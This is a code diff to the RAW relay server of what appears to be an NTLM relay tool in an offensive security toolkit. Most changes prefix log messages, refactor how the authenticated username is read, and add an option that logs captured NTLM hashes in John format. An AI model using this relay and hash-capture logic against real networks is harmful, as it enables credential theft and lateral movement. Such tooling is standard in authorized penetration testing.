@@ -65,10 +65,10 @@ class RAWRelayServer(Thread):
                 self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
             self.target = self.server.config.target.getTarget()
             if self.target is None:
-                LOG.info("RAW: Received connection from %s, but there are no more targets left!" % client_address[0])
+                LOG.info("(RAW): Received connection from %s, but there are no more targets left!" % client_address[0])
                 return
 
-            LOG.info("RAW: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
+            LOG.info("(RAW): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
 
             super().__init__(request, client_address, server)
 
@@ -79,7 +79,7 @@ class RAWRelayServer(Thread):
 
             if not self.do_ntlm_negotiate(ntlm_negotiate):
                 # Connection failed
-                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
+                LOG.error('(RAW): Negotiating NTLM with %s://%s failed. Skipping to next target',
                           self.target.scheme, self.target.netloc)
                 self.server.config.target.registerTarget(self.target)
 
@@ -101,12 +101,12 @@ class RAWRelayServer(Thread):
                     self.request.sendall(struct.pack('?', False))
 
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                        LOG.error("(RAW): Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('utf-16le'),
                             authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                        LOG.error("(RAW): Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
@@ -116,19 +116,22 @@ class RAWRelayServer(Thread):
                     self.request.sendall(struct.pack('?', True))
 
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
-                            authenticateMessage['user_name'].decode('utf-16le')))
+                        LOG.info("(RAW): Authenticating connection from %s/%s@%s against %s://%s SUCCEED" % (
+                            authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
+                            self.client_address[0], self.target.scheme, self.target.netloc))
                     else:
-                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
-                            authenticateMessage['user_name'].decode('ascii')))
+                        LOG.info("(RAW): Authenticating connection from %s/%s@%s against %s://%s SUCCEED" % (
+                            authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
+                            self.client_address[0], self.target.scheme, self.target.netloc))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
                                                         authenticateMessage['domain_name'],
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
+
+                    if self.server.config.dumpHashes is True:
+                        LOG.info("(RAW): %s" % ntlm_hash_data['hash_string'])
 
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
@@ -159,20 +162,14 @@ class RAWRelayServer(Thread):
                 if self.challengeMessage is False:
                     return False
             else:
-                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
+                LOG.error('(RAW): Protocol Client for %s not found!' % self.target.scheme.upper())
                 return False
 
             return True
 
         def do_ntlm_auth(self, token, authenticateMessage):
-
             # For some attacks it is important to know the authenticated username, so we store it
-            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
-                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()
-            else:
-                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
-                                            authenticateMessage['user_name'].decode('ascii'))).upper()
+            self.authUser = authenticateMessage.getUserString()
 
             if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
@@ -201,7 +198,7 @@ class RAWRelayServer(Thread):
                                                                                self.authUser)
                 clientThread.start()
             else:
-                LOG.error('No attack configured for %s' % self.target.scheme.upper())
+                LOG.error('(RAW): No attack configured for %s' % self.target.scheme.upper())
 
     def __init__(self, config):
         Thread.__init__(self)
